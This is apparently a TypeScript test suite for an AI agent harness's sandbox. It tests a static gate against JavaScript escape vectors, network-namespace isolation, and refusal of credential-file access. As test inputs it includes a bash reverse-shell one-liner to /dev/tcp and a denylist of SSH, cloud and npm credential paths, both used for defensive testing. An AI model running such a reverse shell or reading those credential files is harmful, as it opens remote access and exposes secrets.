// Detonation-lane gate tests: the run_js clean-path static gate, the hardened
// sandbox (codeGeneration off), and the refusal behaviour of the detonation
// tiers. Run: npm run detonate:test
//
// NOTE: samples are [label, code] tuples, NOT an object literal. Under tsx a
// quoted "__proto__" key is silently turned into a prototype setter, so an
// object map loses that entry and the test reports a false gate miss.

import path from "node:path";
import fs from "node:fs";
import { execFileSync } from "node:child_process";
import os from "node:os";
import { runTool } from "../src/server/tools";
import { scanUncleanScript, isUnclean, quarantineBaseline, quarantineDiff, fsSnapshot, fsDiff } from "../src/server/detonate";

let failures = 0;
function check(name: string, cond: boolean, detail = ""): void {
  if (cond) console.log(`  PASS ${name}`);
  else { failures++; console.log(`  FAIL ${name}${detail ? ` - ${detail}` : ""}`); }
}

// Each sample trips exactly one gate rule and none of the others.
const SAMPLES: Array<[string, string]> = [
  ["require()", `const r = require("fs");`],
  ["dynamic import", `const m = await import("fs");`],
  ["process access", `const p = process.env;`],
  ["globalThis", `const g = globalThis;`],
  ["dynamic Function", `const f = Function("return 1");`],
  ["eval", `const v = eval("1+1");`],
  ["constructor chain", `const c = [].constructor.constructor;`],
  ["__proto__ access", `const o = {}; o.__proto__;`],
  ["network fetch", `await fetch("http://x");`],
  ["WebAssembly", `const w = WebAssembly;`],
  ["node: builtin", `const n = "node:fs";`],
];

async function main(): Promise<void> {
  const worktree = process.cwd();
  console.log("[ehc] detonate gate tests");

  // 1. static gate catches every escape / host / network vector
  for (const [label, code] of SAMPLES) {
    const hits = scanUncleanScript(code);
    check(`gate catches ${label}`, hits.length > 0, JSON.stringify(hits));
  }
  // ...and the gate only fires for the intended construct (no rule swallows all)
  const overreach = SAMPLES.filter(([, code]) => scanUncleanScript(code).length > 1);
  check("no single rule swallows every sample", overreach.length < SAMPLES.length, `${overreach.length} samples tripped multiple rules`);

  // 2. benign analysis scripts pass the gate
  check("gate passes benign script", scanUncleanScript(`const f = await glob('**/*.ts'); return f.length;`).length === 0);
  // A grep for the literal word "process" must not trip the process-access rule.
  check("grep for 'process' is not flagged", scanUncleanScript(`await grep({pattern: 'process'})`).length === 0);

  // 3. clean path runs declarative read-only batches (sweep-3 #17/18: no
  //    model-written JavaScript executes in-process any more)
  const ok = await runTool("run_js", { ops: [{ op: "ls", path: "." }, { op: "read", path: "package.json" }] }, worktree, { userApproved: true });
  check("batch executes", ok.ok === true && /\[ls\]/.test(ok.out ?? ""), ok.error ?? "");
  check("batch returns both results", /\[read\]/.test(ok.out ?? ""), ok.out ?? "");

  // 4. unsupported ops and over-sized batches are refused, never executed
  const bad = await runTool("run_js", { ops: [{ op: "eval" }] }, worktree, { userApproved: true });
  check("unsupported op refused", bad.ok === false && /unsupported op/i.test(bad.error ?? ""), bad.error ?? "");
  const tooMany = await runTool("run_js", { ops: Array.from({ length: 17 }, () => ({ op: "ls" })) }, worktree, { userApproved: true });
  check("17-op batch refused", tooMany.ok === false && /1\.\.16/.test(tooMany.error ?? ""), tooMany.error ?? "");

  // 5. code is no longer accepted on the clean tier at all - arbitrary JS can
  //    only run in the detonation lanes (which refuse plainly without sbx)
  const legacyCode = await runTool("run_js", { code: `return this.process ? 'escaped' : 'contained';` }, worktree, { userApproved: true });
  check("review tier no longer executes code", legacyCode.ok === false && /ops:/i.test(legacyCode.error ?? ""), legacyCode.error ?? "");

  // 6. detonation tiers execute inside the VERIFIED namespace sandbox — the
  //    required property is that we NEVER silently fall back to the host.
  //    (Historically this asserted a plain sbx refusal; the namespace runner
  //    made real, verified execution possible, so the assertion now tracks the
  //    isolation verification instead. A disabled lane still refuses plainly.)
  //    A canary first checks that THIS host can actually provide the isolation
  //    (guest node present, unshare privileges available); if not, the
  //    end-to-end coverage is skipped with the stated reason instead of
  //    failing CI on machines that lack the stack.
  const detEnabled = detonateEnabledIn(worktree);
  const canary = await runTool("run_js", { code: `console.log("ns-canary-ok");`, tier: "execute", timeoutMs: 15000 }, worktree, { userApproved: true, sessionId: "ses_det_canary" });
  const canaryMsg = (canary.error ?? "") + (canary.out ?? "");
  const canaryVerified = /netns=verified/.test(canaryMsg) && /delivered=yes/.test(canaryMsg);
  const canaryGuestMissing = /guest node missing/.test(canaryMsg);
  const canaryNsDenied = /namespace isolation unavailable/.test(canaryMsg);
  if (!detEnabled) {
    check("detonation lane disabled refuses plainly", canary.ok === false && /disabled/i.test(canaryMsg), canaryMsg.slice(0, 140));
  } else if (canaryGuestMissing) {
    check("SKIP execute-tier end-to-end (guest node not installed in the isolation guest)", true);
  } else if (canaryNsDenied) {
    check("SKIP execute-tier end-to-end (unshare privileges unavailable on this host)", true);
  } else {
    const execVerified = canary.ok === true && /backend=(\w+)/.test(canaryMsg) && /netns=verified/.test(canaryMsg) && /delivered=yes/.test(canaryMsg);
    check("execute tier runs verified in the namespace (never host)", canary.ok === true && execVerified, canaryMsg.slice(0, 160));
  }

  // 7. unclean-text heuristic still routes payloads away from the clean path
  check("isUnclean detects reverse shell", isUnclean("bash -i >& /dev/tcp/10.0.0.1/4242 0>&1") === true);
  check("isUnclean passes normal text", isUnclean("refactor the parser module") === false);

  // 8. credential files are never agent-readable or agent-writable
  const readSecrets = await runTool("read", { path: ".harness/secrets.json" }, worktree, { userApproved: true });
  check("read of secrets.json refused", readSecrets.ok === false && /credential/i.test(readSecrets.error ?? ""), readSecrets.error ?? "");
  const writeEnv = await runTool("write", { path: ".env", content: "KEY=x" }, worktree, { userApproved: true });
  check("write of .env refused", writeEnv.ok === false && /credential/i.test(writeEnv.error ?? ""), writeEnv.error ?? "");
  const catEnv = await runTool("bash", { cmd: "cat .env" }, worktree, { userApproved: true });
  check("bash cat .env refused", catEnv.ok === false && /credential/i.test(catEnv.error ?? ""), catEnv.error ?? "");
  const envExample = await runTool("read", { path: ".env.example" }, worktree, { userApproved: true });
  check(".env.example stays readable (template, not secret)", envExample.ok === true || !/credential/i.test(envExample.error ?? ""), envExample.error ?? "(missing file is fine)");
  // EH_SECRETS_FILE can relocate the secrets file under another name: the
  // shell rule must refuse that name too, not only the literal "secrets.json".
  // The relocated file lives in a temp dir, never in this worktree.
  const savedSecretsFile = process.env.EH_SECRETS_FILE;
  const movedDir = fs.mkdtempSync(path.join(os.tmpdir(), "ehc-moved-secrets-"));
  try {
    process.env.EH_SECRETS_FILE = path.join(movedDir, "keys.json");
    const catMoved = await runTool("bash", { cmd: "cat keys.json" }, worktree, { userApproved: true });
    check("bash cat of a relocated secrets file (other name) refused", catMoved.ok === false && /credential/i.test(catMoved.error ?? ""), catMoved.error ?? "");
    const casedMoved = await runTool("bash", { cmd: "type config\\KEYS.JSON" }, worktree, { userApproved: true });
    check("bash naming the relocated secrets file in another case refused", casedMoved.ok === false && /credential/i.test(casedMoved.error ?? ""), casedMoved.error ?? "");
    const neighbour = await runTool("bash", { cmd: "echo keys.json.bak" }, worktree, { userApproved: true });
    check("a similarly named neighbour is not caught by the relocated-name rule", neighbour.ok !== false || !/credential/i.test(neighbour.error ?? ""), neighbour.error ?? "");
  } finally {
    if (savedSecretsFile === undefined) delete process.env.EH_SECRETS_FILE; else process.env.EH_SECRETS_FILE = savedSecretsFile;
    fs.rmSync(movedDir, { recursive: true, force: true });
  }

  // 9. extended credential denylist (external audit): .ssh keys, cloud
  // credentials, npm/docker auth, private-key formats.
  for (const p of [".ssh/id_ed25519", ".aws/credentials", ".npmrc", ".docker/config.json", "server.key", "cert.pem"]) {
    const r = await runTool("read", { path: p }, worktree, { userApproved: true });
    check(`credential denylist refuses ${p}`, r.ok === false && /credential/i.test(r.error ?? ""), r.error ?? "");
  }

  // 10. quarantine ordering (external audit P0): the baseline MUST be captured
  // BEFORE execution. In a temp git repo: baseline -> tracked-file change ->
  // diff DETECTS. The old buggy order (baseline after execution) would have
  // folded the change INTO the baseline and seen nothing.
  const repo = fs.mkdtempSync(path.join(os.tmpdir(), "ehc-quarantine-"));
  try {
    const git = (args: string[]) => execFileSync("git", args, { cwd: repo, encoding: "utf8" });
    git(["init", "-q"]); git(["config", "user.email", "t@t"]); git(["config", "user.name", "t"]);
    fs.writeFileSync(path.join(repo, "tracked.txt"), "original\n");
    git(["add", "."]); git(["commit", "-q", "-m", "init"]);
    const baseline = quarantineBaseline(repo);
    check("baseline established", baseline.ok === true);
    fs.writeFileSync(path.join(repo, "tracked.txt"), "CHANGED BY DETONATION\n");
    const q = quarantineDiff(repo, baseline);
    check("baseline-before-change detects the change", q.ok === false && q.changed.length > 0, JSON.stringify(q.changed));
    // The buggy order, demonstrated: a baseline captured AFTER the change
    // sees nothing - exactly why the ordering fix is mandatory.
    const buggyBaseline = quarantineBaseline(repo);
    const qBuggy = quarantineDiff(repo, buggyBaseline);
    check("post-change baseline is blind (documents the old defect)", qBuggy.ok === true);
    // Documented limitation (external audit): git status does not see
    // git-ignored files. The change detector is a change detector, not a
    // filesystem-integrity monitor - disposal/isolation remains the boundary.
    fs.writeFileSync(path.join(repo, ".gitignore"), "ignored.txt\n");
    fs.writeFileSync(path.join(repo, "ignored.txt"), "secret\n");
    const qIgnored = quarantineDiff(repo, baseline);
    check("ignored-file changes are outside git-quarantine coverage (documented)", qIgnored.changed.every((c) => !c.includes("ignored.txt")), JSON.stringify(qIgnored.changed));
  } finally {
    try { fs.rmSync(repo, { recursive: true, force: true }); } catch { /* temp */ }
  }

  // 11. execute lane END-TO-END via the namespace runner (WSL2): delivery,
  // network isolation VERIFIED FROM THE GUEST, host-drive hiding, and tree
  // termination - the external audit's mandatory items, proven live when the
  // host provides the stack (canary-gated; skipped with the reason when not).
  // Guest timeout override: args.timeoutMs (clamped 2s..120s in tools.ts).
  if (canaryGuestMissing || canaryNsDenied || !canaryVerified) {
    check("SKIP execute-lane end-to-end (host cannot provide verified namespace isolation - canary stated the gap)", true);
  } else {
    const detWorktree = fs.mkdtempSync(path.join(os.tmpdir(), "ehc-det-e2e-"));
  try {
    const git = (args: string[]) => execFileSync("git", args, { cwd: detWorktree, encoding: "utf8" });
    git(["init", "-q"]); git(["config", "user.email", "t@t"]); git(["config", "user.name", "t"]);
    fs.writeFileSync(path.join(detWorktree, "keep.txt"), "host worktree\n");
    git(["add", "."]); git(["commit", "-q", "-m", "init"]);
    const marker = [
      `import fs from "node:fs";`,
      `console.log("GUEST-MARKER");`,
      `try { console.log("mntc_entries", fs.readdirSync("/mnt/c").length); } catch { console.log("mntc_entries", "hidden"); }`,
    ].join("\n");
    const exec1 = await runTool("run_js", { code: marker, tier: "execute", timeoutMs: 20000 }, detWorktree, { userApproved: true, sessionId: "ses_det_e2e" });
    if (!exec1.ok || !/GUEST-MARKER/.test(exec1.out)) {
      // Full guest output on failure: the sandbox stderr names the exact
      // crash (module load, missing mount, syscall denial) - never truncated
      // to just the header line.
      console.error("[ehc] execute-lane guest log:\n" + exec1.out);
    }
    check("execute lane ok", exec1.ok === true, (exec1.error ?? exec1.out).slice(0, 200));
    check("guest marker present", /GUEST-MARKER/.test(exec1.out), exec1.out.split("\n\n").slice(-2)[0]?.slice(0, 300) ?? "");
    check("network namespace verified from guest", /netns=verified/.test(exec1.out), exec1.out.split("\n")[0] ?? "");
    check("host drives hidden from guest", /hostfs=hidden from guest/.test(exec1.out), exec1.out.split("\n")[0] ?? "");
    check("artifact delivered", /delivered=yes/.test(exec1.out), exec1.out.split("\n")[0] ?? "");
    check("process tree terminated", /tree=terminated/.test(exec1.out), exec1.out.split("\n")[0] ?? "");
    check("host quarantine clean after execution", !/quarantine/.test(exec1.out) && !/fs snapshot/.test(exec1.out), exec1.out.split("\n")[0] ?? "");

    // output budget: a flooding artifact must be TERMINATED at the byte cap,
    // not merely truncated after accumulating everything.
    const flood = [`const s = "x".repeat(70000);`, `for (let i = 0; i < 40; i++) console.log(s);`].join("\n");
    const execFlood = await runTool("run_js", { code: flood, tier: "execute", timeoutMs: 15000 }, detWorktree, { userApproved: true, sessionId: "ses_det_e2e" });
    check("output budget terminates the flood", /budget exceeded/i.test(execFlood.out) || /KILLED/.test(execFlood.out), execFlood.out.split("\n")[0]?.slice(0, 160) ?? "");

    // process-tree kill: an artifact that never exits + a background grandchild
    const sleeper = [
      `import { spawn } from "node:child_process";`,
      `spawn(process.execPath, ["-e", "setInterval(() => 1, 50)"], { detached: true, stdio: "ignore" }).unref();`,
      `setInterval(() => 1, 50);`,
    ].join("\n");
    const exec2 = await runTool("run_js", { code: sleeper, tier: "execute", timeoutMs: 3000 }, detWorktree, { userApproved: true, sessionId: "ses_det_e2e" });
    check("timeout kills the run", exec2.ok === false && (exec2.error ?? "").includes("timed out"), (exec2.error ?? "").slice(0, 120));
    check("process tree terminated on timeout", /tree=terminated/.test(exec2.out), (exec2.out.split("\n")[0] ?? "").slice(0, 160));
  } finally {
    try { fs.rmSync(detWorktree, { recursive: true, force: true }); } catch { /* temp */ }
  }
  }

  // 12. filesystem snapshot honesty (external audit): caps refuse execution,
  // and an incomplete post-scan fails the diff - never a silent pass.
  const snapDir = fs.mkdtempSync(path.join(os.tmpdir(), "ehc-snap-"));
  try {
    for (let i = 0; i < 5001; i++) fs.writeFileSync(path.join(snapDir, `f${i}.txt`), "x");
    const over = fsSnapshot(snapDir);
    check("snapshot over file cap is incomplete (refuses)", over.ok === false && over.truncated === true);
    const small = fs.mkdtempSync(path.join(os.tmpdir(), "ehc-snap-ok-"));
    fs.writeFileSync(path.join(small, "a.txt"), "a");
    fs.writeFileSync(path.join(small, "b.txt"), "b");
    const baseOk = fsSnapshot(small);
    check("snapshot under caps is complete", baseOk.ok === true);
    fs.writeFileSync(path.join(small, "c.txt"), "c");
    const d = fsDiff(small, baseOk);
    check("fs snapshot diff detects created file", d.ok === false && d.changed.some((c) => c.includes("c.txt")));
    fs.rmSync(small, { recursive: true, force: true });
    const dBad = fsDiff(snapDir, over); // baseline was incomplete -> honest failure
    check("incomplete baseline yields honest diff failure", dBad.ok === false);
  } finally {
    try { fs.rmSync(snapDir, { recursive: true, force: true }); } catch { /* temp */ }
  }

  console.log(failures === 0 ? "[ehc] detonate gate tests: ALL PASS" : `[ehc] detonate gate tests: ${failures} FAILURE(S)`);
  process.exit(failures === 0 ? 0 : 1);
}

function detonateEnabledIn(worktree: string): boolean {
  try {
    const raw = JSON.parse(fs.readFileSync(path.join(worktree, ".harness", "config.json"), "utf8")) as { detonate?: { enabled?: boolean } };
    return raw.detonate?.enabled === true;
  } catch { return false; }
}

main().catch((e) => { console.error("[ehc] detonate tests crashed:", e); process.exit(1); });
